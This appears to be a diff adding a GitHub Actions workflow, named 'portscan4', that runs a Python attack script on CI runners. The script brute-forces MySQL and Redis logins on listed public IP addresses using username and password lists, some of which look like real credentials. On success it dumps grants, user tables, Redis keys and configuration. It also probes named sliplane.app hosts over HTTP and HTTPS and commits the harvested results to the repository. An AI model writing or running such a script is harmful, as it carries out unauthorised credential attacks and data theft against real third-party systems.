@@ -1,0 +1,70 @@
+name: portscan4
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq default-mysql-client redis-tools netcat-openbsd postgresql-client >/dev/null 2>&1 || true
+          echo ok
+      - name: probe
+        run: |
+          mkdir -p results4
+          cat > x4.py <<'PY'
+          import subprocess, os
+          LOG=open('results4/exploit4.log','w')
+          def log(x):
+              print(x); LOG.write(str(x)+'\n'); LOG.flush()
+          def run(cmd,timeout=15):
+              try:
+                  r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT/ERR '+repr(ex)
+          # --- MariaDB / MySQL ---
+          for ip,p in [('65.109.253.170',10003),('142.132.190.176',3306)]:
+              for u in ['root','mysql','admin','demo','app','test','user','sliplane']:
+                  for pw in ['','root','password','admin','demo','sliplane','dus0208l','Nomie6oss','mysql','123456']:
+                      o=run(f"mysql -h {ip} -P {p} -u {u} --password='{pw}' --connect-timeout=3 -N -e 'select version(),current_user(); show databases;' 2>&1",20)
+                      if 'Access denied' in o or 'ERROR 1045' in o: continue
+                      if 'ERROR' in o or 'TIMEOUT' in o or 'Lost connection' in o or 'refused' in o:
+                          log(f'MY {ip}:{p} {u}/{pw!r} => {o[:160]}'); continue
+                      log(f'!!!! MY HIT {ip}:{p} {u}/{pw!r} => {o[:2000]}')
+                      open(f'results4/my_hit_{ip}_{p}.txt','w').write(f'{u}\n{pw}\n{o}\n')
+                      for q in ['show grants;','select user,host,plugin from mysql.user;','show variables like "%dir%";','select @@version_compile_os,@@datadir;']:
+                          log(f'MYQ {q} => '+run(f"mysql -h {ip} -P {p} -u {u} --password='{pw}' --connect-timeout=3 -N -e {q!r}",25)[:2000])
+                      break
+              log(f'MY {ip}:{p} matrix done')
+          # --- Redis ---
+          for ip,p in [('49.13.15.227',10008),('49.13.15.227',10291),('49.13.15.227',6379),('46.224.8.127',6379)]:
+              for pw in [None,'dus0208l','Nomie6oss','root','password','redis']:
+                  auth='' if pw is None else f"-a '{pw}'"
+                  o=run(f"redis-cli -h {ip} -p {p} {auth} --no-auth-warning -t 4 PING",12)
+                  log(f'REDIS {ip}:{p} pw={pw!r} => {o[:160]}')
+                  if 'PONG' in o:
+                      for c in ['INFO server','INFO keyspace','CONFIG GET requirepass','CONFIG GET dir','DBSIZE','KEYS *','CLIENT LIST']:
+                          log(f'REDISQ {ip}:{p} {c} => '+run(f"redis-cli -h {ip} -p {p} {auth} --no-auth-warning -t 6 {c!r}",15)[:2500])
+                      break
+          # --- tiny HTTP ---
+          for ip,p,h in [('5.161.255.2',10016,'server.sliplane.app'),('65.109.253.170',10016,'demo.sliplane.app'),('65.109.253.170',10015,'demo.sliplane.app'),('65.109.253.170',10021,'demo.sliplane.app'),('65.109.253.170',10022,'demo.sliplane.app'),('65.109.253.170',10023,'demo.sliplane.app'),('46.224.8.127',10495,'insurance.sliplane.app'),('188.34.186.195',10698,'testmailbox-admin.sliplane.app')]:
+              o=run(f"curl -sS -m 5 -i --max-time 6 -H 'Host: {h}' 'http://{ip}:{p}/' | head -c 500",12)
+              log(f'HTTP {ip}:{p}/ => {o[:500]!r}')
+              o=run(f"curl -sSk -m 5 -i --max-time 6 -H 'Host: {h}' 'https://{ip}:{p}/' | head -c 500",12)
+              log(f'HTTPS {ip}:{p}/ => {o[:500]!r}')
+          LOG.close()
+          PY
+          python3 x4.py 2>&1 | tail -400
+          ls -la results4
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results4 || true
+          git commit -m "i13835 lean $(date -u +%s)" || true
+          for i in 1 2 3 4 5; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
